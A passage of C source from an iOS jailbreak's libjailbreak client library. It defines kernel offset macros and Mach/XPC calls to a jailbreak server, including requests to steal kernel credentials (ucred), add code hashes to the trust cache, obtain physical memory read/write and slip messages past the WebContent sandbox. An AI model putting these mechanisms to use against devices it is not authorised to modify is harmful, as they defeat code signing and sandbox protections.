#define SYSTEM_INFO_SERIALIZE_COMPONENT(xdict, name) XPC_SET_GENERIC(xdict, #name, gSystemInfo.name)
#define SYSTEM_INFO_SERIALIZE(xdict) SYSTEM_INFO_ITERATE(xdict, SYSTEM_INFO_SERIALIZE_COMPONENT)

#define SYSTEM_INFO_DESERIALIZE_COMPONENT(xdict, name) XPC_GET_GENERIC(xdict, #name, gSystemInfo.name)
#define SYSTEM_INFO_DESERIALIZE(xdict) SYSTEM_INFO_ITERATE(xdict, SYSTEM_INFO_DESERIALIZE_COMPONENT)

#define kconstant(name) (gSystemInfo.kernelConstant.name)
#define jbinfo(name) (gSystemInfo.jailbreakInfo.name)
#define jbsetting(name) (gSystemInfo.jailbreakSettings.name)
#define ksymbol(name) (gSystemInfo.kernelSymbol.name ? (gSystemInfo.kernelConstant.slide + gSystemInfo.kernelSymbol.name) : 0)
#define kgadget(name) (gSystemInfo.kernelGadget.name ? (gSystemInfo.kernelConstant.slide + gSystemInfo.kernelGadget.name) : 0)
#define koffsetof(structname, member) (gSystemInfo.kernelStruct.structname.member)
#define ksizeof(structname) (gSystemInfo.kernelStruct.structname.struct_size)

void jbinfo_initialize_dynamic_offsets(xpc_object_t xoffsetDict);
void jbinfo_initialize_hardcoded_offsets(void);
void jbinfo_initialize_boot_constants(void);
xpc_object_t jbinfo_get_serialized(void);

uint64_t get_vm_real_kernel_page_size(void);
#define vm_real_kernel_page_size get_vm_real_kernel_page_size()
#define vm_real_kernel_page_mask (vm_real_kernel_page_size - 1)

uint64_t get_vm_real_kernel_page_shift(void);
#define vm_real_kernel_page_shift get_vm_real_kernel_page_shift()

uint64_t get_l1_block_size(void);
uint64_t get_l1_block_mask(void);
uint64_t get_l1_block_count(void);
uint64_t get_l2_block_size(void);
uint64_t get_l2_block_mask(void);
uint64_t get_l2_block_count(void);

#define L1_BLOCK_SIZE get_l1_block_size()
#define L1_BLOCK_MASK get_l1_block_mask()
#define L1_BLOCK_COUNT get_l1_block_count()
#define L2_BLOCK_SIZE get_l2_block_size()
#define L2_BLOCK_MASK get_l2_block_mask()
#define L2_BLOCK_COUNT get_l2_block_count()

#endif

```

`BaseBin/libjailbreak/src/jbclient_mach.c`:

```c
#include "jbclient_mach.h"
#include <dispatch/dispatch.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <pthread.h>
#include <mach-o/dyld.h>
#include <dlfcn.h>
extern int fileport_makeport (int fd, mach_port_t * port);

mach_port_t jbclient_mach_get_launchd_port(void)
{
	mach_port_t launchdPort = MACH_PORT_NULL;
	task_get_bootstrap_port(task_self_trap(), &launchdPort);
	return launchdPort;
}

kern_return_t jbclient_mach_send_msg(mach_msg_header_t *hdr, struct jbserver_mach_msg_reply *reply)
{
	mach_port_t replyPort = mig_get_reply_port();
	if (!replyPort)
		return KERN_FAILURE;
	
	mach_port_t launchdPort = jbclient_mach_get_launchd_port();
	if (!launchdPort)
		return KERN_FAILURE;
	
	hdr->msgh_bits |= MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);

	// size already set
	hdr->msgh_remote_port  = launchdPort;
	hdr->msgh_local_port   = replyPort;
	hdr->msgh_voucher_port = 0;
	hdr->msgh_id           = 0x40000000 | 206;
	// 206: magic value to make WebContent work (seriously, this is the only ID that the WebContent sandbox allows)
	
	kern_return_t kr = mach_msg(hdr, MACH_SEND_MSG, hdr->msgh_size, 0, 0, 0, 0);
	if (kr != KERN_SUCCESS) {
		mach_port_deallocate(task_self_trap(), launchdPort);
		return kr;
	}
	
	kr = mach_msg(&reply->msg.hdr, MACH_RCV_MSG, 0, reply->msg.hdr.msgh_size, replyPort, 0, 0);
	if (kr != KERN_SUCCESS) {
		mach_port_deallocate(task_self_trap(), launchdPort);
		return kr;
	}
	
	// Get rid of any rights we might have received
	mach_msg_destroy(&reply->msg.hdr);
	mach_port_deallocate(task_self_trap(), launchdPort);
	return KERN_SUCCESS;
}

int jbclient_mach_process_checkin(char *jbRootPathOut, char *bootUUIDOut, char *sandboxExtensionsOut, bool *fullyDebuggedOut)
{
	struct jbserver_mach_msg_checkin msg;
	msg.base.hdr.msgh_size = sizeof(msg);
	msg.base.hdr.msgh_bits = 0;
	msg.base.action = JBSERVER_MACH_CHECKIN;
	msg.base.magic = JBSERVER_MACH_MAGIC;

	size_t replySize = sizeof(struct jbserver_mach_msg_checkin_reply) + MAX_TRAILER_SIZE;
	uint8_t replyU[replySize];
	bzero(replyU, replySize);
	struct jbserver_mach_msg_checkin_reply *reply = (struct jbserver_mach_msg_checkin_reply *)&replyU;
	reply->base.msg.hdr.msgh_size = replySize;

	kern_return_t kr = jbclient_mach_send_msg(&msg.base.hdr, (struct jbserver_mach_msg_reply *)reply);
	if (kr != KERN_SUCCESS) return kr;

	reply->jbRootPath[sizeof(reply->jbRootPath)-1] = '\0';
	if (jbRootPathOut) strcpy(jbRootPathOut, reply->jbRootPath);

	reply->bootUUID[sizeof(reply->bootUUID)-1] = '\0';
	if (bootUUIDOut) strcpy(bootUUIDOut, reply->bootUUID);

	reply->sandboxExtensions[sizeof(reply->sandboxExtensions)-1] = '\0';
	if(sandboxExtensionsOut) strcpy(sandboxExtensionsOut, reply->sandboxExtensions);

	if (fullyDebuggedOut) *fullyDebuggedOut = reply->fullyDebugged;

	return (int)reply->base.status;
}

int jbclient_mach_fork_fix(pid_t childPid)
{
	struct jbserver_mach_msg_forkfix msg;
	msg.base.hdr.msgh_size = sizeof(msg);
	msg.base.hdr.msgh_bits = 0;
	msg.base.action = JBSERVER_MACH_FORK_FIX;
	msg.base.magic = JBSERVER_MACH_MAGIC;

	msg.childPid = childPid;

	size_t replySize = sizeof(struct jbserver_mach_msg_forkfix_reply) + MAX_TRAILER_SIZE;
	uint8_t replyU[replySize];
	bzero(replyU, replySize);
	struct jbserver_mach_msg_forkfix_reply *reply = (struct jbserver_mach_msg_forkfix_reply *)&replyU;
	reply->base.msg.hdr.msgh_size = replySize;

	kern_return_t kr = jbclient_mach_send_msg(&msg.base.hdr, (struct jbserver_mach_msg_reply *)reply);
	if (kr != KERN_SUCCESS) return kr;

	return (int)reply->base.status;
}

int jbclient_mach_trust_file(int fd, struct siginfo *siginfo)
{
	struct jbserver_mach_msg_trust_fd msg;
	msg.base.hdr.msgh_size = sizeof(msg);
	msg.base.hdr.msgh_bits = 0;
	msg.base.action = JBSERVER_MACH_TRUST_FILE;
	msg.base.magic = JBSERVER_MACH_MAGIC;

	msg.fd = fd;
	msg.siginfoPopulated = siginfo ? true : false;
	if (siginfo) {
		memcpy(&msg.siginfo, siginfo, sizeof(struct siginfo));
	}

	size_t replySize = sizeof(struct jbserver_mach_msg_trust_fd_reply) + MAX_TRAILER_SIZE;
	uint8_t replyU[replySize];
	bzero(replyU, replySize);
	struct jbserver_mach_msg_trust_fd_reply *reply = (struct jbserver_mach_msg_trust_fd_reply *)&replyU;
	reply->base.msg.hdr.msgh_size = replySize;

	kern_return_t kr = jbclient_mach_send_msg(&msg.base.hdr, (struct jbserver_mach_msg_reply *)reply);
	if (kr != KERN_SUCCESS) return kr;

	return (int)reply->base.status;
}
```

`BaseBin/libjailbreak/src/jbclient_mach.h`:

```h
#ifndef __JBCLIENT_MACH
#define __JBCLIENT_MACH

#include <mach/mach.h>
#include <stdint.h>
#include "jbserver.h"

mach_port_t jbclient_mach_get_launchd_port(void);
int jbclient_mach_send_msg(mach_msg_header_t *hdr, struct jbserver_mach_msg_reply *reply);
int jbclient_mach_process_checkin(char *jbRootPathOut, char *bootUUIDOut, char *sandboxExtensionsOut, bool *fullyDebuggedOut);
int jbclient_mach_fork_fix(pid_t childPid);
int jbclient_mach_trust_file(int fd, struct siginfo *siginfo);

#endif
```

`BaseBin/libjailbreak/src/jbclient_xpc.c`:

```c
#include "jbclient_xpc.h"
#include "jbclient_mach.h"
#include "jbserver.h"
#include <dispatch/dispatch.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <pthread.h>
#include <mach-o/dyld.h>
#include <dlfcn.h>
#include <os/alloc_once_private.h>

struct xpc_global_data {
	uint64_t    a;
	uint64_t    xpc_flags;
	mach_port_t    task_bootstrap_port;  /* 0x10 */
#ifndef _64
	uint32_t    padding;
#endif
	xpc_object_t    xpc_bootstrap_pipe;   /* 0x18 */
};

mach_port_t gJBServerCustomPort = MACH_PORT_NULL;

void jbclient_xpc_set_custom_port(mach_port_t serverPort)
{
	if (gJBServerCustomPort != MACH_PORT_NULL) {
		mach_port_deallocate(mach_task_self(), gJBServerCustomPort);
	}
	gJBServerCustomPort = serverPort;
}

xpc_object_t jbserver_xpc_send_dict(xpc_object_t xdict)
{
	xpc_object_t xreply = NULL;

	xpc_object_t xpipe = NULL;
	if (gJBServerCustomPort != MACH_PORT_NULL) {
		// Communicate with custom port if set
		xpipe = xpc_pipe_create_from_port(gJBServerCustomPort, 0);
	}
	else {
		// Else, communicate with launchd
		struct xpc_global_data* globalData = os_alloc_once(OS_ALLOC_ONCE_KEY_LIBXPC, 472, NULL);
		if (!globalData->xpc_bootstrap_pipe) {
			mach_port_t launchdPort = jbclient_mach_get_launchd_port();
			if (launchdPort != MACH_PORT_NULL) {
				globalData->task_bootstrap_port = launchdPort;
				globalData->xpc_bootstrap_pipe = xpc_pipe_create_from_port(globalData->task_bootstrap_port, 0);
			}
		}
		if (!globalData->xpc_bootstrap_pipe) return NULL;
		xpipe = xpc_retain(globalData->xpc_bootstrap_pipe);
	}

	if (!xpipe) return NULL;
	int err = xpc_pipe_routine_with_flags(xpipe, xdict, &xreply, 0);
	xpc_release(xpipe);
	if (err != 0) {
		return NULL;
	}
	return xreply;
}

xpc_object_t jbserver_xpc_send(uint64_t domain, uint64_t action, xpc_object_t xargs)
{
	bool ownsXargs = false;
	if (!xargs) {
		xargs = xpc_dictionary_create_empty();
		ownsXargs = true;
	}

	xpc_dictionary_set_uint64(xargs, "jb-domain", domain);
	xpc_dictionary_set_uint64(xargs, "action", action);

	xpc_object_t xreply = jbserver_xpc_send_dict(xargs);
	if (ownsXargs) {
		xpc_release(xargs);
	}

	return xreply;
}

char *jbclient_get_jbroot(void)
{
	static char rootPath[PATH_MAX] = { 0 };
	static dispatch_once_t dot;

	dispatch_once(&dot, ^{
		xpc_object_t xreply = jbserver_xpc_send(JBS_DOMAIN_SYSTEMWIDE, JBS_SYSTEMWIDE_GET_JBROOT, NULL);
		if (xreply) {
			const char *replyRootPath = xpc_dictionary_get_string(xreply, "root-path");
			if (replyRootPath) {
				strlcpy(&rootPath[0], replyRootPath, sizeof(rootPath));
			}
			xpc_release(xreply);
		}
	});

	if (rootPath[0] == '\0') return NULL;
	return (char *)&rootPath[0];
}

char *jbclient_get_boot_uuid(void)
{
	static char bootUUID[37] = { 0 };
	static dispatch_once_t dot;

	dispatch_once(&dot, ^{
		xpc_object_t xreply = jbserver_xpc_send(JBS_DOMAIN_SYSTEMWIDE, JBS_SYSTEMWIDE_GET_BOOT_UUID, NULL);
		if (xreply) {
			const char *replyBootUUID = xpc_dictionary_get_string(xreply, "boot-uuid");
			if (replyBootUUID) {
				strlcpy(&bootUUID[0], replyBootUUID, sizeof(bootUUID));
			}
			xpc_release(xreply);
		}
	});

	if (bootUUID[0] == '\0') return NULL;
	return (char *)&bootUUID[0];
}

int jbclient_trust_file(int fd, struct siginfo *siginfo)
{
	xpc_object_t xargs = xpc_dictionary_create_empty();
	xpc_dictionary_set_uint64(xargs, "fd", (uint64_t)fd);
	if (siginfo) xpc_dictionary_set_data(xargs, "siginfo", siginfo, sizeof(struct siginfo));
	xpc_object_t xreply = jbserver_xpc_send(JBS_DOMAIN_SYSTEMWIDE, JBS_SYSTEMWIDE_TRUST_FILE, xargs);
	xpc_release(xargs);
	if (xreply) {
		int64_t result = xpc_dictionary_get_int64(xreply, "result");
		xpc_release(xreply);
		return result;
	}
	return -1;
}

int jbclient_trust_file_by_path(const char *path)
{
	int fd = open(path, O_RDONLY);
	if (fd < 0) return -1;

	int r = jbclient_trust_file(fd, NULL);
	close(fd);
	return r;
}

int jbclient_process_checkin(char **rootPathOut, char **bootUUIDOut, char **sandboxExtensionsOut, bool *fullyDebuggedOut)
{
	xpc_object_t xreply = jbserver_xpc_send(JBS_DOMAIN_SYSTEMWIDE, JBS_SYSTEMWIDE_PROCESS_CHECKIN, NULL);
	if (xreply) {
		int64_t result = xpc_dictionary_get_int64(xreply, "result");
		const char *rootPath = xpc_dictionary_get_string(xreply, "root-path");
		const char *bootUUID = xpc_dictionary_get_string(xreply, "boot-uuid");
		const char *sandboxExtensions = xpc_dictionary_get_string(xreply, "sandbox-extensions");
		if (rootPathOut) *rootPathOut = rootPath ? strdup(rootPath) : NULL;
		if (bootUUIDOut) *bootUUIDOut = bootUUID ? strdup(bootUUID) : NULL;
		if (sandboxExtensionsOut) *sandboxExtensionsOut = sandboxExtensions ? strdup(sandboxExtensions) : NULL;
		if (fullyDebuggedOut) *fullyDebuggedOut = xpc_dictionary_get_bool(xreply, "fully-debugged");
		xpc_release(xreply);
		return result;
	}
	return -1;
}

int jbclient_fork_fix(uint64_t childPid)
{
	xpc_object_t xargs = xpc_dictionary_create_empty();
	xpc_dictionary_set_uint64(xargs, "child-pid", childPid);
	xpc_object_t xreply = jbserver_xpc_send(JBS_DOMAIN_SYSTEMWIDE, JBS_SYSTEMWIDE_FORK_FIX, xargs);
	xpc_release(xargs);
	if (xreply) {
		int result = xpc_dictionary_get_int64(xreply, "result");
		xpc_release(xreply);
		return result;
	}
	return -1;
}

int jbclient_cs_revalidate(void)
{
	xpc_object_t xreply = jbserver_xpc_send(JBS_DOMAIN_SYSTEMWIDE, JBS_SYSTEMWIDE_CS_REVALIDATE, NULL);
	if (xreply) {
		int result = xpc_dictionary_get_int64(xreply, "result");
		xpc_release(xreply);
		return result;
	}
	return -1;
}

int jbclient_jbsettings_get(const char *key, xpc_object_t *valueOut)
{
	xpc_object_t xargs = xpc_dictionary_create_empty();
	xpc_dictionary_set_string(xargs, "key", key);
	xpc_object_t xreply = jbserver_xpc_send(JBS_DOMAIN_SYSTEMWIDE, JBS_SYSTEMWIDE_JBSETTINGS_GET, xargs);
	xpc_release(xargs);
	if (xreply) {
		int result = xpc_dictionary_get_int64(xreply, "result");
		xpc_object_t value = xpc_dictionary_get_value(xreply, "value");
		if (value && valueOut) *valueOut = xpc_copy(value);
		xpc_release(xreply);
		return result;
	}
	return -1;
}

bool jbclient_jbsettings_get_bool(const char *key)
{
	xpc_object_t value;
	if (jbclient_jbsettings_get(key, &value) == 0) {
		if (value) {
			bool valueBool = xpc_bool_get_value(value);
			xpc_release(value);
			return valueBool;
		}
	}
	return false;
}

uint64_t jbclient_jbsettings_get_uint64(const char *key)
{
	xpc_object_t value;
	if (jbclient_jbsettings_get(key, &value) == 0) {
		if (value) {
			uint64_t valueU64 = xpc_uint64_get_value(value);
			xpc_release(value);
			return valueU64;
		}
	}
	return 0;
}

double jbclient_jbsettings_get_double(const char *key)
{
	xpc_object_t value;
	if (jbclient_jbsettings_get(key, &value) == 0) {
		if (value) {
			double valueDouble = xpc_double_get_value(value);
			xpc_release(value);
			return valueDouble;
		}
	}
	return 0;
}

int jbclient_platform_set_process_debugged(uint64_t pid, bool fullyDebugged)
{
	xpc_object_t xargs = xpc_dictionary_create_empty();
	xpc_dictionary_set_uint64(xargs, "pid", pid);
	xpc_dictionary_set_bool(xargs, "fully-debugged", fullyDebugged);
	xpc_object_t xreply = jbserver_xpc_send(JBS_DOMAIN_PLATFORM, JBS_PLATFORM_SET_PROCESS_DEBUGGED, xargs);
	xpc_release(xargs);
	if (xreply) {
		int result = xpc_dictionary_get_int64(xreply, "result");
		xpc_release(xreply);
		return result;
	}
	return -1;
}

int jbclient_platform_stage_jailbreak_update(const char *updateTar)
{
	char realUpdateTarPath[PATH_MAX];
	if (!realpath(updateTar, realUpdateTarPath)) return -1;

	xpc_object_t xargs = xpc_dictionary_create_empty();
	xpc_dictionary_set_string(xargs, "update-tar", realUpdateTarPath);
	xpc_object_t xreply = jbserver_xpc_send(JBS_DOMAIN_PLATFORM, JBS_PLATFORM_STAGE_JAILBREAK_UPDATE, xargs);
	xpc_release(xargs);
	if (xreply) {
		int result = xpc_dictionary_get_int64(xreply, "result");
		xpc_release(xreply);
		return result;
	}
	return -1;
}

int jbclient_platform_jbsettings_set(const char *key, xpc_object_t value)
{
	xpc_object_t xargs = xpc_dictionary_create_empty();
	xpc_dictionary_set_string(xargs, "key", key);
	xpc_dictionary_set_value(xargs, "value", value);
	xpc_object_t xreply = jbserver_xpc_send(JBS_DOMAIN_PLATFORM, JBS_PLATFORM_JBSETTINGS_SET, xargs);
	xpc_release(xargs);
	if (xreply) {
		int result = xpc_dictionary_get_int64(xreply, "result");
		xpc_release(xreply);
		return result;
	}
	return -1;
}

int jbclient_platform_jbsettings_set_bool(const char *key, bool boolValue)
{
	xpc_object_t value = xpc_bool_create(boolValue);
	int r = jbclient_platform_jbsettings_set(key, value);
	xpc_release(value);
	return r;
}

int jbclient_platform_jbsettings_set_uint64(const char *key, uint64_t uint64Value)
{
	xpc_object_t value = xpc_uint64_create(uint64Value);
	int r = jbclient_platform_jbsettings_set(key, value);
	xpc_release(value);
	return r;
}

int jbclient_platform_jbsettings_set_double(const char *key, double doubleValue)
{
	xpc_object_t value = xpc_double_create(doubleValue);
	int r = jbclient_platform_jbsettings_set(key, value);
	xpc_release(value);
	return r;
}

int jbclient_platform_set_systemwide_domain_enabled(bool enabled)
{
	xpc_object_t xargs = xpc_dictionary_create_empty();
	xpc_dictionary_set_bool(xargs, "enabled", enabled);
	xpc_object_t xreply = jbserver_xpc_send(JBS_DOMAIN_PLATFORM, JBS_PLATFORM_SET_SYSTEMWIDE_DOMAIN_ENABLED, xargs);
	xpc_release(xargs);
	if (xreply) {
		int result = xpc_dictionary_get_int64(xreply, "result");
		xpc_release(xreply);
		return result;
	}
	return -1;
}

int jbclient_watchdog_intercept_userspace_panic(const char *panicMessage)
{
	xpc_object_t xargs = xpc_dictionary_create_empty();
	xpc_dictionary_set_string(xargs, "panic-message", panicMessage);
	xpc_object_t xreply = jbserver_xpc_send(JBS_DOMAIN_WATCHDOG, JBS_WATCHDOG_INTERCEPT_USERSPACE_PANIC, xargs);
	xpc_release(xargs);
	if (xreply) {
		int result = xpc_dictionary_get_int64(xreply, "result");
		xpc_release(xreply);
		return result;
	}
	return -1;
}

int jbclient_watchdog_get_last_userspace_panic(char **panicMessage)
{
	xpc_object_t xreply = jbserver_xpc_send(JBS_DOMAIN_WATCHDOG, JBS_WATCHDOG_GET_LAST_USERSPACE_PANIC, NULL);
	if (xreply) {
		int result = xpc_dictionary_get_int64(xreply, "result");
		const char *receivedMessage = xpc_dictionary_get_string(xreply, "panic-message");
		if (receivedMessage) {
			*panicMessage = strdup(receivedMessage);
		}
		xpc_release(xreply);
		return result;
	}
	return -1;
}

int jbclient_root_get_physrw(bool singlePTE, uint64_t *singlePTEAsidPtr)
{
	xpc_object_t xargs = xpc_dictionary_create_empty();
	xpc_dictionary_set_bool(xargs, "single-pte", singlePTE);
	xpc_object_t xreply = jbserver_xpc_send(JBS_DOMAIN_ROOT, JBS_ROOT_GET_PHYSRW, xargs);
	xpc_release(xargs);
	if (xreply) {
		if (singlePTEAsidPtr) {
			*singlePTEAsidPtr = xpc_dictionary_get_uint64(xreply, "single-pte-asid-ptr");
		}
		int64_t result = xpc_dictionary_get_int64(xreply, "result");
		xpc_release(xreply);
		return result;
	}
	return -1;
}

int jbclient_root_sign_thread(mach_port_t threadPort)
{
	xpc_object_t xargs = xpc_dictionary_create_empty();
	xpc_dictionary_set_uint64(xargs, "thread-port", threadPort);
	xpc_object_t xreply = jbserver_xpc_send(JBS_DOMAIN_ROOT, JBS_ROOT_SIGN_THREAD, xargs);
	xpc_release(xargs);
	if (xreply) {
		int result = xpc_dictionary_get_int64(xreply, "result");
		xpc_release(xreply);
		return result;
	}
	return -1;
}

int jbclient_root_get_sysinfo(xpc_object_t *sysInfoOut)
{
	xpc_object_t xreply = jbserver_xpc_send(JBS_DOMAIN_ROOT, JBS_ROOT_GET_SYSINFO, NULL);
	if (xreply) {
		xpc_object_t sysInfo = xpc_dictionary_get_dictionary(xreply, "sysinfo");
		if (sysInfo && sysInfoOut) *sysInfoOut = xpc_copy(sysInfo);
		int result = xpc_dictionary_get_int64(xreply, "result");
		xpc_release(xreply);
		return result;
	}
	return -1;
}

int jbclient_root_steal_ucred(uint64_t ucredToSteal, uint64_t *orgUcred)
{
	xpc_object_t xargs = xpc_dictionary_create_empty();
	xpc_dictionary_set_uint64(xargs, "ucred", ucredToSteal);
	xpc_object_t xreply = jbserver_xpc_send(JBS_DOMAIN_ROOT, JBS_ROOT_STEAL_UCRED, xargs);
	xpc_release(xargs);
	if (xreply) {
		int64_t result = xpc_dictionary_get_int64(xreply, "result");
		if (orgUcred) *orgUcred = xpc_dictionary_get_uint64(xreply, "org-ucred");
		xpc_release(xreply);
		return result;
	}
	return -1;
}

int jbclient_root_set_mac_label(uint64_t slot, uint64_t label, uint64_t *orgLabel)
{
	xpc_object_t xargs = xpc_dictionary_create_empty();
	xpc_dictionary_set_uint64(xargs, "slot", slot);
	xpc_dictionary_set_uint64(xargs, "label", label);
	xpc_object_t xreply = jbserver_xpc_send(JBS_DOMAIN_ROOT, JBS_ROOT_SET_MAC_LABEL, xargs);
	xpc_release(xargs);
	if (xreply) {
		int64_t result = xpc_dictionary_get_int64(xreply, "result");
		if (orgLabel) *orgLabel = xpc_dictionary_get_uint64(xreply, "org-label");
		xpc_release(xreply);
		return result;
	}
	return -1;
}

int jbclient_root_trustcache_info(xpc_object_t *infoOut)
{
	xpc_object_t xreply = jbserver_xpc_send(JBS_DOMAIN_ROOT, JBS_ROOT_TRUSTCACHE_INFO, NULL);
	if (xreply) {
		int64_t result = xpc_dictionary_get_int64(xreply, "result");
		xpc_object_t info = xpc_dictionary_get_array(xreply, "tc-info");
		if (infoOut && info) *infoOut = xpc_copy(info);
		xpc_release(xreply);
		return result;
	}
	return -1;
}

int jbclient_root_trustcache_add_cdhash(uint8_t *cdhashData, size_t cdhashLen)
{
	xpc_object_t xargs = xpc_dictionary_create_empty();
	xpc_dictionary_set_data(xargs, "cdhash", cdhashData, cdhashLen);
	xpc_object_t xreply = jbserver_xpc_send(JBS_DOMAIN_ROOT, JBS_ROOT_TRUSTCACHE_ADD_CDHASH, xargs);
	xpc_release(xargs);
	if (xreply) {
		int64_t result = xpc_dictionary_get_int64(xreply, "result");
		xpc_release(xreply);
		return result;
	}
	return -1;
}

int jbclient_root_trustcache_clear(void)
{
	xpc_object_t xreply = jbserver_xpc_send(JBS_DOMAIN_ROOT, JBS_ROOT_TRUSTCACHE_CLEAR, NULL);
	if (xreply) {
		int64_t result = xpc_dictionary_get_int64(xreply, "result");
		xpc_release(xreply);
		return result;
	}
	return -1;
}

int jbclient_boomerang_done(void)
{
	xpc_object_t xreply = jbserver_xpc_send(JBS_DOMAIN_ROOT, JBS_BOOMERANG_DONE, NULL);
	if (xreply) {
		int64_t result = xpc_dictionary_get_int64(xreply, "result");
		xpc_release(xreply);
		return result;
	}
	return -1;
}
```

`BaseBin/libjailbreak/src/jbclient_xpc.h`:

```h
#ifndef JBCLIENT_XPC_H
#define JBCLIENT_XPC_H

#include <xpc/xpc.h>
#include <xpc_private.h>
#include <stdint.h>
#include "signatures.h"

void jbclient_xpc_set_custom_port(mach_port_t serverPort);

xpc_object_t jbserver_xpc_send_dict(xpc_object_t xdict);
xpc_object_t jbserver_xpc_send(uint64_t domain, uint64_t action, xpc_object_t xargs);

char *jbclient_get_jbroot(void);
char *jbclient_get_boot_uuid(void);
int jbclient_trust_file(int fd, struct siginfo *siginfo);
int jbclient_trust_file_by_path(const char *path);
int jbclient_process_checkin(char **rootPathOut, char **bootUUIDOut, char **sandboxExtensionsOut, bool *fullyDebuggedOut);
int jbclient_fork_fix(uint64_t childPid);
int jbclient_cs_revalidate(void);
int jbclient_jbsettings_get(const char *key, xpc_object_t *valueOut);
bool jbclient_jbsettings_get_bool(const char *key);
uint64_t jbclient_jbsettings_get_uint64(const char *key);
double jbclient_jbsettings_get_double(const char *key);
int jbclient_platform_set_process_debugged(uint64_t pid, bool fullyDebugged);
int jbclient_platform_stage_jailbreak_update(const char *updateTar);
int jbclient_platform_jbsettings_set(const char *key, xpc_object_t value);
int jbclient_platform_jbsettings_set_bool(const char *key, bool boolValue);
int jbclient_platform_jbsettings_set_uint64(const char *key, uint64_t uint64Value);
int jbclient_platform_jbsettings_set_double(const char *key, double doubleValue);
int jbclient_platform_set_systemwide_domain_enabled(bool enabled);
int jbclient_watchdog_intercept_userspace_panic(const char *panicMessage);
int jbclient_watchdog_get_last_userspace_panic(char **panicMessage);
int jbclient_root_get_physrw(bool singlePTE, uint64_t *singlePTEAsidPtr);
int jbclient_root_sign_thread(mach_port_t threadPort);
int jbclient_root_get_sysinfo(xpc_object_t *sysInfoOut);
int jbclient_root_steal_ucred(uint64_t ucredToSteal, uint64_t *orgUcred);
int jbclient_root_set_mac_label(uint64_t slot, uint64_t label, uint64_t *orgLabel);
int jbclient_root_trustcache_info(xpc_object_t *infoOut);
int jbclient_root_trustcache_add_cdhash(uint8_t *cdhashData, size_t cdhashLen);
int jbclient_root_trustcache_clear(void);
int jbclient_boomerang_done(void);

#endif

```

`BaseBin/libjailbreak/src/jbroot.c`:

```c
#include "info.h"

char *get_jbroot(void)
{
	return jbinfo(rootPath);
}
```

`BaseBin/libjailbreak/src/jbroot.h`:

```h
#ifndef JBROOT_H
#define JBROOT_H

extern char *_Nullable get_jbroot(void);

// Partially adapted from libroot for consistency
// This can be included even when libjailbreak is not linked, as long as the includer implements the get_jbroot symbol

__attribute__((__overloadable__))
static inline const char *_Nullable __jbroot_convert_path(const char *_Nullable path, char *_Nonnull buf) {
	if (!buf || !path) return NULL;
	const char *jbroot = get_jbroot();
	if (!jbroot) return NULL;
	strlcpy(buf, jbroot, PATH_MAX);
	strlcat(buf, path, PATH_MAX);
	return buf;
}

#ifdef __OBJC__
#import <Foundation/Foundation.h>

__attribute__((__overloadable__))
static inline NSString *_Nullable __jbroot_convert_path(NSString *_Nullable path, void *_Nullable const __unused buf) {
	char tmpBuf[PATH_MAX];
	const char *convertedPath = __jbroot_convert_path(path.fileSystemRepresentation, tmpBuf);
	return convertedPath ? [NSString stringWithUTF8String:convertedPath] : nil;
}

#endif

#define __BUFFER_FOR_CHAR_P(x) \
	__builtin_choose_expr(										\
		__builtin_types_compatible_p(__typeof__(*(x)), char),	\
		alloca(PATH_MAX),										\
		NULL													\
	)

#define JBROOT_PATH(path) __jbroot_convert_path((path), __BUFFER_FOR_CHAR_P(path))
#define ROOTFS_PATH(path) __jbroot_convert_path((path), __BUFFER_FOR_CHAR_P(path))

#endif
```

`BaseBin/libjailbreak/src/jbserver.c`:

```c
#include "jbserver.h"
#include "util.h"

int jbserver_received_xpc_message(struct jbserver_impl *server, xpc_object_t xmsg)
{
	if (xpc_get_type(xmsg) != XPC_TYPE_DICTIONARY) return -1;

	if (!xpc_dictionary_get_value(xmsg, "jb-domain")) return -1;
	if (!xpc_dictionary_get_value(xmsg, "action")) return -1;

	uint64_t domainIdx = xpc_dictionary_get_uint64(xmsg, "jb-domain");
	if (domainIdx == 0) return -1;
	struct jbserver_domain *domain = server->domains[0];
	for (int i = 1; i < domainIdx && domain; i++) {
		domain = server->domains[i];
	}
	if (!domain) return -1;

	audit_token_t clientToken = { 0 };
	xpc_dictionary_get_audit_token(xmsg, &clientToken);

	if (domain->permissionHandler) {
		if (!domain->permissionHandler(clientToken)) return -2;
	}

	uint64_t actionIdx = xpc_dictionary_get_uint64(xmsg, "action");
	if (actionIdx == 0) return -1;
	struct jbserver_action *action = &domain->actions[0];
	for (int i = 1; i < actionIdx && action->handler; i++) {
		action = &domain->actions[i];
	}
	if (!action->handler) return -1;

	int (*handler)(void *a1, void *a2, void *a3, void *a4, void *a5, void *a6, void *a7, void *a8) = action->handler;
	void *args[8] = { NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL };
	void *argsOut[8] = { NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL };

	for (uint64_t i = 0; action->args[i].name && i < 8; i++) {
		jbserver_arg *argDesc = &action->args[i];
		if (!argDesc->out) {
			switch (argDesc->type) {
				case JBS_TYPE_BOOL:
				args[i] = (void *)xpc_dictionary_get_bool(xmsg, argDesc->name);
				break;
				case JBS_TYPE_UINT64:
				args[i] = (void *)xpc_dictionary_get_uint64(xmsg, argDesc->name);
				break;
				case JBS_TYPE_FD:
				args[i] = (void *)(int64_t)xpc_dictionary_dup_fd(xmsg, argDesc->name);
				break;
				case JBS_TYPE_STRING:
				args[i] = (void *)xpc_dictionary_get_string(xmsg, argDesc->name);
				break;
				case JBS_TYPE_DATA: { // Data occupies 2 arguments (buf, len)
					if (i < 7) {
						args[i] = (void *)xpc_dictionary_get_data(xmsg, argDesc->name, (size_t *)&args[i+1]); i++;
					}
					break;
				}
				case JBS_TYPE_ARRAY:
				args[i] = (void *)xpc_dictionary_get_array(xmsg, argDesc->name);
				break;
				case JBS_TYPE_DICTIONARY:
				args[i] = (void *)xpc_dictionary_get_dictionary(xmsg, argDesc->name);
				break;
				case JBS_TYPE_XPC_GENERIC:
				args[i] = (void *)xpc_dictionary_get_value(xmsg, argDesc->name);
				break;
				case JBS_TYPE_CALLER_TOKEN:
				args[i] = (void *)&clientToken;
				break;
			}
		}
		else {
			args[i] = &argsOut[i];
		}
	}

	int result = handler(args[0], args[1], args[2], args[3], args[4], args[5], args[6], args[7]);

	xpc_object_t xreply = xpc_dictionary_create_reply(xmsg);
